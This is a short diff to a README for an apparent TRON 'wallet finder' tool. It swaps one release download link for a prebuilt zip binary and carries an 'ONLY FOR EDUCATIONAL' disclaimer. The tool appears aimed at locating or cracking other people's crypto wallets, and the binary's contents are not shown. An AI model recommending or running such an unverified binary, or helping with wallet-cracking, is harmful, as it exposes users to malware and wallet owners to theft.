@@ -34,5 +34,5 @@ Demo :
 
 Or you can run it from binary files without python:
 
-Download: https://github.com/Genkai91/trx-wallet-finder/releases/download/trx/trx.zip
+Download: https://github.com/Genkai91/trx-wallet-finder/releases/download/trx/trx-finder.zip
 ## ONLY FOR EDUCATIONAL
